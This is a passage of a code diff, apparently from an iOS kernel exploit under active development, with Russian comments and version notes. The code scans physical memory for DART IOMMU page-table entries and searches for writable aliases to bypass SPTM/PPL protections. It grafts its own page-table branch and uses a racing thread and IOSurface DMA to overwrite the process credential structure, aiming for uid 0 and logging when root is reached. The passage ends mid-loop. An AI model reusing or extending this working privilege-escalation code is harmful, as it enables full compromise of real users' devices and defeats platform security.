+                        if (pa < 0x10008000000ULL || pa >= 0x10010000000ULL) continue;
+                        uint64_t q0 = 0, q1 = 0;
+                        memcpy(&q0, ftChunk + e * 16, 8);
+                        memcpy(&q1, ftChunk + e * 16 + 8, 8);
+                        kpNote(r, [NSString stringWithFormat:@"  [P3M] %#llx t=%#x q0=%#018llx q1=%#018llx",
+                                  (unsigned long long)pa, t, (unsigned long long)q0, (unsigned long long)q1]);
+                        nMeta++;
+                    }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P3M] мета-захват: %d кандидатов окна — начинаю контент-скан", nMeta]);
+            }
+            // 1.9.193: тройной заход против убийцы у КРАЯ табличного региона
+            // (тихий ресет 00:37 — смерть на фрейме сразу за полосой 0x9):
+            //  pass 0: редкие типы, ТОЛЬКО окно таблиц [0x10008000000..0x10010000000]
+            //          (оба бута DART-таблицы сидели там — в 4 раза меньше поле смерти);
+            //  pass 1: редкие типы, полный проход;
+            //  pass 2: 0x21, кап 2048.
+            // Пауза 2мс после предсмертной строки — os_log успевает уйти по USB
+            // до смертельного чтения: убийца будет назван, даже если гипотеза мимо.
+            for (int pass = 0; pass < 3 && !pteVA && ftVA; pass++) {
+                for (uint64_t fb = 0; fb < totalPages && !pteVA; fb += 4096) {
+                    uint64_t nent = totalPages - fb; if (nent > 4096) nent = 4096;
+                    kreadbuf(ftVA + fb * 16, ftChunk, (size_t)(nent * 16));
+                    for (uint64_t e = 0; e < nent && !pteVA; e++) {
+                        uint8_t t = ftChunk[e * 16 + 2];   // тип = байт 2 (LE, bits[23:16])
+                        BOOL rare = (t == 0x8 || t == 0x9 || t == 0x13 || t == 0x17 || t == 0xc || t == 0x6);
+                        if (pass < 2 ? !rare : (t != 0x21)) continue;
+                        uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
+                        if (pass == 0 && (pa < 0x10008000000ULL || pa >= 0x10010000000ULL)) continue;   // окно таблиц
+                        nCand++;
+                        if (pass == 2 && nScanned >= 2048) { nCap++; continue; }
+                        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+                        if (!kva) continue;
+                        if (kpVAIsEL2Domain(kva)) continue;   // 1.9.192: physmap-VA может численно попасть в SPTM/TXM-полосу — пропуск
+                        nScanned++;
+                        // 1.9.192: предсмертная запись — лог ДО контент-чтения.
+                        // Тихий ресет 00:09 пришёлся на середину скана: последняя
+                        // строка назовёт тип убийцы (census-стратегия, поймавшая 0xb).
+                        kpNote(r, [NSString stringWithFormat:@"  [P3] читаю фрейм %#llx t=%#x kva=%#llx",
+                                  (unsigned long long)pa, t, (unsigned long long)kva]);
+                        usleep(2000);   // 1.9.193: дать os_log уйти по USB до смертельного чтения
+                        uint8_t pbuf[0x4000];
+                        kreadbuf(kva, pbuf, sizeof(pbuf));   // рет НЕ проверяем — шим всегда 0 (урок SCAN A)
+                        for (uint32_t o = 0; o + 8 <= sizeof(pbuf) && !pteVA; o += 8) {
+                            uint64_t q = 0; memcpy(&q, pbuf + o, 8);
+                            if (!q) continue;
+                            // кодировка A: PA в битах[12:47]; C: PA в [14:41]
+                            BOOL exA = ((q & 0x0000FFFFFFFFF000ULL) == backingPA) && (q & ~0x0000FFFFFFFFF000ULL);
+                            BOOL exC = !exA && ((q & 0x000003FFFFFFC000ULL) == backingPA) && (q & ~0x000003FFFFFFC000ULL);
+                            if (exA || exC) {
+                                pteVA = kva + o; origPTE = q;
+                                ptePAFound = pa + o;   // 1.9.196: точный PA — kva=phystokv(pa), walker не нужен
+                                ptePAMask = exA ? 0x0000FFFFFFFFF000ULL : 0x000003FFFFFFC000ULL;
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] ★ PTE dst @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx — кодировка %@",
+                                          (unsigned long long)pteVA, (unsigned long long)pa, t, o / 8,
+                                          (unsigned long long)q, exA ? @"A[12:47]" : @"C[14:41]"]);
+                                break;
+                            }
+                            if (srcPA && ((q & 0x0000FFFFFFFFF000ULL) == srcPA) && (q & ~0x0000FFFFFFFFF000ULL)) {
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] src-PTE @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx — НЕ трогаем",
+                                          (unsigned long long)(kva + o), (unsigned long long)pa, t, o / 8, (unsigned long long)q]);
+                            }
+                            if (nLoose < 8 && (q & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL) && (q & ~0x000003FFFE000000ULL)) {
+                                nLoose++;
+                                kpNote(r, [NSString stringWithFormat:@"  [P3] рыхлый кандидат @ %#llx (фрейм %#llx тип %#x слот %u): %#018llx",
+                                          (unsigned long long)(kva + o), (unsigned long long)pa, t, o / 8, (unsigned long long)q]);
+                            }
+                        }
+                    }
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [P3] frame-scan: кандидатов=%d обойдено=%d (кап-пропуск=%d) рыхлых=%d srcPA=%#llx — %@",
+                      nCand, nScanned, nCap, nLoose, (unsigned long long)srcPA, pteVA ? @"PTE НАЙДЕН" : @"PTE нет"]);
+        }
+        if (pteVA) {
+            // 1.9.190: ФИНАЛЬНЫЙ ГЕЙТ перед kwrite (урок паники 23:02 — ложный
+            // матч повёл запись в kernel image): (1) pteVA вне kernel image,
+            // (2) текущее PA-поле == backingPA ТОЧНО, (3) фрейм не deadly.
+            // 1.9.191: inImage НЕ считается для табличных фреймов {8,9,13} —
+            // physmap лежит близко к image и DART-таблица попала в окно 96MB
+            // (ложный ГЕЙТ ОТКАЗ на настоящем PTE типа 0x9). У image-страниц
+            // тип НЕ табличный — тип фрейма и есть точный дискриминатор.
+            uint64_t kbase190 = kconstant(base);
+            uint64_t ptePA190 = kvtophys(pteVA);
+            int ftype190 = ptePA190 ? kpFrameTypeOf(ptePA190) : -1;
+            BOOL tblFrame = (ftype190 == 0x8 || ftype190 == 0x9 || ftype190 == 0x13);
+            BOOL inImage = (pteVA >= kbase190 && pteVA < kbase190 + 0x6000000ULL) && !tblFrame;
+            BOOL exactPA = ((origPTE & ptePAMask) == (backingPA & ptePAMask)) &&
+                           ((origPTE & 0x0000FFFFFFFFF000ULL) == backingPA ||
+                            (origPTE & 0x000003FFFFFFC000ULL) == backingPA);
+            BOOL deadly = ptePA190 && kpFrameDeadly(ptePA190);
+            if (inImage || !exactPA || deadly) {
+                kpNote(r, [NSString stringWithFormat:@"  [P2] ГЕЙТ ОТКАЗ: inImage=%d exactPA=%d deadly=%d ftype=%#x — ЗАПИСЬ ОТМЕНЕНА (pteVA=%#llx origPTE=%#018llx)",
+                          inImage, exactPA, deadly, ftype190, (unsigned long long)pteVA, (unsigned long long)origPTE]);
+                pteVA = 0;
+            }
+        }
+        if (pteVA) {
+            // 1.9.195: ЗАПИСЬ ЧЕРЕЗ PHYSMAP-АЛИАС = ПАНИКА (доказано 01:51: x1=pteVA).
+            // SPTM держит per-page права на апертуру: DART-таблицы RO через physmap,
+            // PPL CPU-таблицы фолтят даже на чтение (убийца 0x1000a1c000). Но сам
+            // IODARTFamily пишет PTE ежедневно — через ДРУГОЙ алиас той же страницы
+            // (zone-map/служебная карта), который SPTM не охраняет. Ищем указатель P
+            // среди объектов цепочки с kvtophys(P) на той же странице, что ptePA.
+            uint64_t ptePA195 = ptePAFound ? ptePAFound : kvtophys(pteVA);   // 1.9.196: скан-PA приоритетнее walker'а (слепые зоны)
+            uint64_t ptePagePA = ptePA195 & ~0x3fffULL;
+            uint64_t aliasVA = 0;
+            uint64_t pools[8] = { mapVA, dartVA, pipeVA, provVA,
+                                  kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xc10)) : 0, 0, 0, 0 };
+            uint32_t poolSz[8] = { 0xa78, 0x1000, 0x400, 0x200, 0x200, 0, 0, 0 };
+            // сегментные структуры mapper'а — вероятнейшие держатели табличных VA
+            int npool = 5;
+            for (uint32_t sg = 0; sg < 3 && npool < 8; sg++) {
+                uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)sg * 8)) : 0;
+                if (kpLooksLikeKernelPointer(s) && kpSafeToRead(s)) { pools[npool] = s; poolSz[npool] = 0xa0; npool++; }
+            }
+            int nAlias = 0, nLink = 0;
+            for (int pi = 0; pi < npool && !aliasVA; pi++) {
+                uint64_t obj = pools[pi];
+                if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+                for (uint32_t o = 0; o + 8 <= poolSz[pi] && !aliasVA; o += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                    // 1.9.196: link-форма — родительская запись держит лист как PA>>4
+                    // (маска расширена до [14:47]: узкая 0x3ffffffc000 режет бит 40 наших страниц)
+                    uint64_t qraw = early_kread64(obj + o);
+                    if (qraw && ((qraw << 4) & 0x0000FFFFFFFFC000ULL) == ptePagePA) {
+                        nLink++;
+                        kpNote(r, [NSString stringWithFormat:@"  [P4] link-ссылка на лист: pool%d+%#x q=%#018llx ← родительская запись таблицы",
+                                  pi, o, (unsigned long long)qraw]);
+                    }
+                    if (!kpLooksLikeKernelPointer(P)) continue;
+                    uint64_t ppa = kvtophys(P);
+                    if (ppa && (ppa & ~0x3fffULL) == ptePagePA) {
+                        aliasVA = (P & ~0x3fffULL) | (pteVA & 0x3fffULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [P4] ★ АЛИАС таблицы: pool%d+%#x P=%#llx → запись через %#llx (минуя physmap)",
+                                  pi, o, (unsigned long long)P, (unsigned long long)aliasVA]);
+                    }
+                    if (ppa && (ppa & 0xfffff000000ULL) == (ptePagePA & 0xfffff000000ULL)) nAlias++;   // соседи для статистики
+                }
+            }
+            if (!aliasVA) {
+                kpNote(r, [NSString stringWithFormat:@"  [P4] алиас не найден (соседей по PA: %d, link-ссылок: %d) — запись через physmap ОТМЕНЕНА (SPTM RO, паника 01:51). Нужен RE адресации таблиц драйвера", nAlias, nLink]);
+                pteVA = 0;
+            } else {
+                pteVA = aliasVA;   // дальше патч/чек идут через алиас
+            }
+        }
+        // 1.9.210: P5 — ZONE-АЛИАС таблиц. Physmap RO (паника 01:51), но драйвер
+        // пишет PTE из EL1 — через другой VA. Сегментные структуры [dartObj+0xcd0]
+        // в zone-полосе: если kvtophys(struct) в табличном регионе — это страницы
+        // таблиц, и zone-VA = алиас записи. Proof: scratch в пустой слот через
+        // zone-VA, сверка через physmap. Потом pv reverse-lookup листа → PTE patch.
+        if (!pteVA && ptePAFound) {
+            BOOL zoneOK = NO;
+            for (uint32_t i = 0; i < 8 && !zoneOK; i++) {
+                uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                uint64_t spa = kvtophys(s);
+                int st = spa ? kpFrameTypeOf(spa) : -1;
+                kpNote(r, [NSString stringWithFormat:@"  [P5] seg[%u]=%#llx → PA %#llx тип %#x", i, (unsigned long long)s, (unsigned long long)spa, st]);
+                if (spa >= 0x10008000000ULL && spa < 0x10010000000ULL) {
+                    for (uint32_t o = 0x40; o + 8 <= 0x400; o += 8) {
+                        if (early_kread64(s + o) != 0) continue;
+                        usleep(2000);   // os_log впереди возможной паники
+                        early_kwrite64(s + o, 0x5AFEC0FFEE112233ULL);
+                        uint64_t rbA = early_kread64(s + o);
+                        uint64_t phk = phystokv(spa);
+                        uint64_t rbB = phk ? early_kread64(phk + o) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [P5] ★ PROOF zone-запись в таблицу seg[%u]+%#x: zone=%#018llx physmap=%#018llx — %@",
+                                  i, o, (unsigned long long)rbA, (unsigned long long)rbB,
+                                  (rbA == 0x5AFEC0FFEE112233ULL) ? @"ZONE-АЛИАС ПИШЕТ!" : @"мимо"]);
+                        early_kwrite64(s + o, 0);
+                        zoneOK = (rbA == 0x5AFEC0FFEE112233ULL);
+                        break;
+                    }
+                }
+            }
+            if (zoneOK) {
+                uint64_t ppnum = (ptePAFound & ~0x3fffULL) >> 14;
+                uint64_t pvTab = ksymbol(pv_head_table);
+                uint64_t pvh = pvTab ? early_kread64(pvTab + ppnum * 8) : 0;
+                kpNote(r, [NSString stringWithFormat:@"  [P5] pv: ppnum=%#llx head=%#llx", (unsigned long long)ppnum, (unsigned long long)pvh]);
+                uint64_t node = pvh;
+                for (int depth = 0; depth < 8 && kpLooksLikeKernelPointer(node) && !pteVA; depth++) {
+                    uint64_t cands[3] = { early_kread64(node + 0), early_kread64(node + 8), early_kread64(node + 0x10) };
+                    kpNote(r, [NSString stringWithFormat:@"    pv[%d] %#llx: {%#018llx, %#018llx, %#018llx}", depth, (unsigned long long)node,
+                              (unsigned long long)cands[0], (unsigned long long)cands[1], (unsigned long long)cands[2]]);
+                    for (int c = 0; c < 3 && !pteVA; c++) {
+                        uint64_t cv = kp_untag_ptr(cands[c]);
+                        if (cv >= 0xffffffd000000000ULL && cv < 0xfffffff000000000ULL && (cv & 0x3fffULL) == (ptePAFound & 0x3fffULL)) {
+                            pteVA = cv;
+                            kpNote(r, [NSString stringWithFormat:@"  [P5] ★ ZONE-АЛИАС листа: pv[%d] поле%d = %#llx — запись PTE через неё", depth, c, (unsigned long long)cv]);
+                        }
+                    }
+                    node = 0;
+                    for (int c = 0; c < 3 && !node; c++) {
+                        uint64_t nx = kp_untag_ptr(cands[c]);
+                        if (kpLooksLikeKernelPointer(nx) && nx != pteVA) node = nx;
+                    }
+                }
+                if (!pteVA) kpNote(r, @"  [P5] pv-цепочка не дала zone-VA листа — layout в логе для разбора");
+            } else {
+                kpNote(r, @"  [P5] seg-структуры вне табличного региона — proof не состоялся");
+            }
+            // 1.9.212: P6 — zone-VA листа контент-поиском по ЗОНЕ (pv на 18.6
+            // PAC-хэширован — head=0xaa09…). origPTE уникален: сканируем окно
+            // ±32MB вокруг seg-кластера драйвера (таблицы того же аллокатора).
+            // Дыры зоны пропускает walker-гейт, чтение kreadbuf постранично.
+            if (!pteVA && ptePAFound && origPTE) {
+                uint64_t mn = ~0ULL, mx = 0;
+                for (uint32_t i = 0; i < 8; i++) {
+                    uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                    if (!kpLooksLikeKernelPointer(s)) continue;
+                    if (s < mn) mn = s;
+                    if (s > mx) mx = s;
+                }
+                if (mn != ~0ULL) {
+                    uint64_t lo = (mn & ~0x3fffULL) - 0x2000000ULL;
+                    uint64_t hi = (mx & ~0x3fffULL) + 0x2000000ULL;
+                    int nPages = 0, nMapped = 0;
+                    kpNote(r, [NSString stringWithFormat:@"  [P6] zone-скан окна [%#llx..%#llx) на origPTE %#018llx",
+                              (unsigned long long)lo, (unsigned long long)hi, (unsigned long long)origPTE]);
+                    for (uint64_t pg = lo; pg < hi && !pteVA; pg += 0x4000) {
+                        nPages++;
+                        if (!kpSafeToRead(pg)) continue;   // дыра/защищённая — тихо мимо
+                        // 1.9.228: P6 тоже на фильтр {0x21,0x6,0xc} — unfiltered
+                        // kreadbuf по PPL-read странице = смерть (1.9.227 pid 425)
+                        uint64_t ppa228 = kvtophys(pg);
+                        int pft228 = ppa228 ? kpFrameTypeOf(ppa228) : -1;
+                        if (!(pft228 == 0x21 || pft228 == 0x6 || pft228 == 0xc)) continue;
+                        nMapped++;
+                        uint8_t zbuf[0x4000];
+                        kreadbuf(pg, zbuf, sizeof(zbuf));
+                        for (uint32_t o = 0; o + 8 <= sizeof(zbuf) && !pteVA; o += 8) {
+                            uint64_t q = 0; memcpy(&q, zbuf + o, 8);
+                            if (q != origPTE) continue;
+                            if ((pg + o) == (ptePAFound & ~0x3fffULL)) continue;   // physmap-алиас сам себя
+                            pteVA = pg + o;
+                            kpNote(r, [NSString stringWithFormat:@"  [P6] ★ ZONE-АЛИАС листа @ %#llx (qword %#018llx) — запись PTE через zone",
+                                      (unsigned long long)pteVA, (unsigned long long)q]);
+                        }
+                    }
+                    if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P6] окно обойдено: страниц=%d mapped=%d — origPTE в зоне не найден (расширить?)", nPages, nMapped]);
+                }
+            }
+        }
+        // 1.9.213: P7 DART GRAFT — вместо поиска zone-VA чужого листа ПРИВИВАЕМ
+        // свою ветку: L0[0] нашего сегмента пуст, seg-структуры пишутся через
+        // zone-VA (P5 proof). Строим L1→L2→L3 в своих wired-страницах (PA через
+        // нашу pmap), L0[0]=ссылка на L1, L3[leaf]=целевой PTE (ctl2 для proof,
+        // потом ucredPA для форжа). DART ходит по нашей ветке — мимо physmap RO,
+        // rewriter'а и лотерей. Race-тред дожимает L0[0] против re-map драйвера.
+        if (!pteVA && ptePAFound) {
+            uint64_t dvaG = dva ? dva : 0x10122000000ULL;
+            uint64_t pageIdxG = dvaG >> 14;
+            uint32_t ig[4] = { (uint32_t)((pageIdxG & 0x3e00000000ULL) >> 33),
+                               (uint32_t)((pageIdxG & 0x1ffc00000ULL) >> 22),
+                               (uint32_t)((pageIdxG & 0x3ff800ULL) >> 11),
+                               (uint32_t)(pageIdxG & 0x7ff) };
+            uint8_t *L1p = valloc(0x4000), *L2p = valloc(0x4000), *L3p = valloc(0x4000);
+            uint8_t *ctl2 = valloc(0x4000);
+            memset(L1p, 0, 0x4000); memset(L2p, 0, 0x4000); memset(L3p, 0, 0x4000); memset(ctl2, 0xDD, 0x4000);
+            uint64_t L1PA = vtophys(ttM, (uint64_t)L1p), L2PA = vtophys(ttM, (uint64_t)L2p),
+                     L3PA = vtophys(ttM, (uint64_t)L3p), ctl2PA = vtophys(ttM, (uint64_t)ctl2);
+            // валидация PA как у ctlPA (маркер → phystokv)
+            *(volatile uint64_t *)L1p = 0xBADC0FFEE00D0001ULL;
+            uint64_t pv1 = L1PA ? phystokv(L1PA) : 0;
+            BOOL paOK = pv1 && early_kread64(pv1) == 0xBADC0FFEE00D0001ULL;
+            kpNote(r, [NSString stringWithFormat:@"  [P7] DVA=%#llx idx %u/%u/%u/%u L1PA=%#llx L2PA=%#llx L3PA=%#llx ctl2PA=%#llx — PA-валидация: %@",
+                      (unsigned long long)dvaG, ig[0], ig[1], ig[2], ig[3],
+                      (unsigned long long)L1PA, (unsigned long long)L2PA, (unsigned long long)L3PA, (unsigned long long)ctl2PA,
+                      paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — стоп"]);
+            if (paOK && ig[0] == 0) {
+                *(volatile uint64_t *)L1p = 0;   // убрать маркер
+                // звенья: link = (childPA>>4)|1 (р.50); PTE флаги — из живого origPTE
+                uint64_t linkFlags = (origPTE & ~0x0000FFFFFFFFF000ULL);
+                *(uint64_t *)(L1p + (uint64_t)ig[1] * 8) = (L2PA >> 4) | 1;
+                *(uint64_t *)(L2p + (uint64_t)ig[2] * 8) = (L3PA >> 4) | 1;
+                *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = ctl2PA | linkFlags;
+                // 1.9.218: валидация цели прививки — mseg = 0x21-объекты с vtable
+                // (low32 0x3ff1f9e8 у всех), НЕ таблицы: запись туда = коррупция
+                // (тихий ресет 1.9.217). Цель только если q0 = PA-link форма
+                // (не kernel-ptr) ИЛИ 0, И frame-type страницы ∈ {0x8,0x9,0x13}
+                // (настоящие таблицы DART — 0x21-объекты DART не читает вообще).
+                uint64_t segVA = 0, segOrig = 0;
+                for (uint32_t i = 0; i < 16; i++) {
+                    uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)i * 8)) : 0;
+                    if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                    uint64_t q0 = early_kread64(s + 0x00);
+                    uint64_t q0u = kp_untag_ptr(q0);
+                    uint64_t spa = kvtophys(s);
+                    int sft = spa ? kpFrameTypeOf(spa) : -1;
+                    BOOL tblOK = (sft == 0x8 || sft == 0x9 || sft == 0x13);
+                    BOOL linkOK = (q0 == 0) || (!kpLooksLikeKernelPointer(q0u) && ((q0 << 4) & 0x0000FFFFFFFFC000ULL));
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] mseg[%u]=%#llx PA=%#llx тип=%#x q0=%#018llx — tbl=%d link=%d",
+                              i, (unsigned long long)s, (unsigned long long)spa, sft, (unsigned long long)q0, tblOK, linkOK]);
+                    if (!segVA && tblOK && linkOK) { segVA = s; segOrig = q0; }
+                }
+                if (!segVA) {   // fallback: dartObj-структуры с той же валидацией
+                    for (uint32_t i = 0; i < 8 && !segVA; i++) {
+                        uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                        if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                        uint64_t q0 = early_kread64(s + 0x00);
+                        uint64_t spa = kvtophys(s);
+                        int sft = spa ? kpFrameTypeOf(spa) : -1;
+                        if (!(sft == 0x8 || sft == 0x9 || sft == 0x13)) continue;
+                        if (q0 == 0) { segVA = s; segOrig = 0; }
+                    }
+                }
+                if (!segVA) kpNote(r, @"  [P7] валидной цели (таблица {8,9,13} + пустой/link слот) нет — прививка ОТМЕНЕНА, объекты не трогаем");
+                kpNote(r, [NSString stringWithFormat:@"  [P7] segVA=%#llx L0[%u] orig=%#018llx — прививка link=%#018llx",
+                          (unsigned long long)segVA, ig[0], (unsigned long long)segOrig, (unsigned long long)((L1PA >> 4) | 1)]);
+                if (segVA) {
+                    uint64_t l0slot = segVA + (uint64_t)ig[0] * 8;
+                    early_kwrite64(l0slot, (L1PA >> 4) | 1);
+                    uint64_t rbL0 = early_kread64(l0slot);
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] L0[%u] readback=%#018llx — %@", ig[0], (unsigned long long)rbL0,
+                              rbL0 == ((L1PA >> 4) | 1) ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    if (rbL0 == ((L1PA >> 4) | 1)) {
+                        // race-тред: дожимаем L0[0] всё окно execute (драйвер может переписать)
+                        __block volatile BOOL stopRace = NO;
+                        __block volatile uint64_t raceSlot = l0slot;
+                        __block volatile uint64_t raceVal = (L1PA >> 4) | 1;
+                        // 1.9.214: дожим ДВУХ слотов — драйвер на re-map идёт по НАШЕЙ
+                        // ветке (L0[0] валиден → уровень есть) и затирает L3[0]
+                        // настоящим PTE. Молотим и L0[0], и L3[leaf] всё окно.
+                        __block volatile uint64_t raceLeaf = (uint64_t)(L3p + (uint64_t)ig[3] * 8);
+                        __block volatile uint64_t raceLeafVal = ctl2PA | linkFlags;
+                        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                            while (!stopRace) {
+                                early_kwrite64(raceSlot, raceVal);              // L0[0] в ядре — kwrite
+                                *(volatile uint64_t *)raceLeaf = raceLeafVal;   // L3[leaf] в НАШЕЙ памяти — прямой стор
+                                usleep(50);
+                            }
+                        });
+                        uint8_t tsdG[0x1B0];
+                        memcpy(tsdG, tsdV, sizeof(tsdG));
+                        *(uint32_t *)(tsdG + 0) = srcID;
+                        *(uint32_t *)(tsdG + 4) = dstID;
+                        *(uint64_t *)(tsdG + 8) = 1;
+                        kern_return_t gkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdG, sizeof(tsdG), NULL, NULL, NULL, NULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] graft-submit kr=0x%x — жду DMA по нашей ветке", gkr]);
+                        usleep(400000);
+                        stopRace = YES;
+                        // 1.9.214: readback всех уровней ПОСЛЕ окна — доказательство,
+                        // ходил ли драйвер по нашей ветке (L1/L2 сохранились, L3 затёрт?)
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] post: L0[0]=%#018llx L1[%u]=%#018llx L2[%u]=%#018llx L3[%u]=%#018llx",
+                              (unsigned long long)early_kread64(l0slot), ig[1], *(volatile uint64_t *)(L1p + (uint64_t)ig[1] * 8),
+                              ig[2], *(volatile uint64_t *)(L2p + (uint64_t)ig[2] * 8),
+                              ig[3], *(volatile uint64_t *)(L3p + (uint64_t)ig[3] * 8)]);
+                        int ch2 = 0;
+                        for (uint32_t i = 0; i < 0x4000; i += 4) {
+                            uint32_t px = *(volatile uint32_t *)(ctl2 + i);
+                            if (px != 0xDDDDDDDD && px != 0) { ch2++; if (ch2 <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl2+%#x: %#010x", i, px]); }
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [P7] ctl2 changed=%d — %@", ch2,
+                                  ch2 ? @"★★★ GRAFT РАБОТАЕТ: DART прошёл по нашей ветке!" : @"ветка проигнорирована (TLB/инвалид)"]);
+                        // restore L0[0]=orig всегда (активная — её настоящий link, пустая — 0)
+                        early_kwrite64(l0slot, segOrig);
+                        if (ch2) {
+                            // ФОРЖ: L3[leaf] → ucredPA, src = payload
+                            uint64_t prF2 = 0, roF2 = 0, ucF2 = 0;
+                            if (selfProcM) {
+                                prF2 = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                                roF2 = prF2 ? kp_untag_ptr(prF2) : 0;
+                                ucF2 = roF2 ? kp_untag_ptr(early_kread64(roF2 + koffsetof(proc_ro, ucred))) : 0;
+                            }
+                            uint64_t upageVA = ucF2 & ~0x3fffULL;
+                            uint32_t uoff2 = (uint32_t)(ucF2 & 0x3fff);
+                            uint64_t upagePA = kpLooksLikeKernelPointer(ucF2) ? kvtophys(upageVA) : 0;
+                            uint64_t upkva = upagePA ? phystokv(upagePA) : 0;
+                            BOOL uOK = upkva && early_kread64(upkva) == early_kread64(upageVA) &&
+                                       (uint32_t)early_kread64(upkva + uoff2 + 0x18) == (uint32_t)getuid() && uoff2 + 0xc0 <= 0x1000;
+                            kpNote(r, [NSString stringWithFormat:@"  [P7-F] ucred=%#llx upagePA=%#llx — валидация: %@", (unsigned long long)ucF2, (unsigned long long)upagePA, uOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ"]);
+                            if (uOK) {
+                                uint8_t fbuf2[0x1000];
+                                for (uint32_t i = 0; i < 0x1000; i += 8) *(uint64_t *)(fbuf2 + i) = early_kread64(upageVA + i);
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x18) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x1c) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x20) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x28) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x68) = 0;
+                                *(uint32_t *)(fbuf2 + uoff2 + 0x6c) = 0;
+                                *(uint64_t *)(fbuf2 + uoff2 + 0x78) = 0;
+                                IOSurfaceLock(srcS, 0, NULL);
+                                uint8_t *sp3 = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+                                if (sp3) memcpy(sp3, fbuf2, 0x1000);
+                                IOSurfaceUnlock(srcS, 0, NULL);
+                                *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = upagePA | linkFlags;
+                                // L0[0] снова наш link + race
+                                stopRace = NO;
+                                dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                                    while (!stopRace) { early_kwrite64(raceSlot, raceVal); usleep(50); }
+                                });
+                                kern_return_t fkr2 = IOConnectCallMethod(victim, 1, NULL, 0, tsdG, sizeof(tsdG), NULL, NULL, NULL, NULL);
+                                kpNote(r, [NSString stringWithFormat:@"  [P7-F] forge-submit kr=0x%x — DMA в ucred", fkr2]);
+                                usleep(400000);
+                                stopRace = YES;
+                                early_kwrite64(l0slot, segOrig);
+                                uid_t gu2 = getuid(); gid_t gg2 = getgid();
+                                uint32_t cru2 = (uint32_t)early_kread64(ucF2 + 0x18);
+                                kpNote(r, [NSString stringWithFormat:@"  [P7-F] getuid()=%u getgid()=%u cr_uid=%u", gu2, gg2, cru2]);
+                                if (gu2 == 0) kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — DART GRAFT форж ucred РАБОТАЕТ ===");
+                            }
+                        }
+                    }
+                }
+            }
+            free(L1p); free(L2p); free(L3p); free(ctl2);
+        }
+        if (pteVA) {
+            uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
+            usleep(4000);   // 1.9.195: os_log должен уйти до возможной паники на записи
+            early_kwrite64(pteVA, newPTE);
+            uint64_t rb = early_kread64(pteVA);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] readback PTE = %#018llx — %@",
+                      (unsigned long long)rb, rb == newPTE ? @"ПРИЛИПЛО" : @"НЕ прилипло (SPTM?)"]);
+            if (rb == newPTE) {
+                // 1.9.161: bit43 (reuse mapping) — только на victim #2: #1 маппит
+                // свежим (bit43=0), иначе при отсутствии кэша DMA вообще нет
+                uint8_t tsdV2[0x1B0];
+                memcpy(tsdV2, tsdV, sizeof(tsdV2));
+                *(uint32_t *)(tsdV2 + 0) = srcID;   // 1.9.178: victim#2 — src fresh НАСТОЯЩИЙ (tsdV нёс srcBad), dst тот же + reuse
+                *(uint64_t *)(tsdV2 + 0x20) |= (1ULL << 43);
+                kern_return_t v2kr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV2, sizeof(tsdV2), NULL, NULL, NULL, NULL);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] victim #2 submit (reuse mapping): kr=0x%x — жду DMA в ctl", v2kr]);
+                usleep(300000);
+                int changed2 = 0;
+                for (uint32_t i = 0; i < 0x4000; i += 4) {
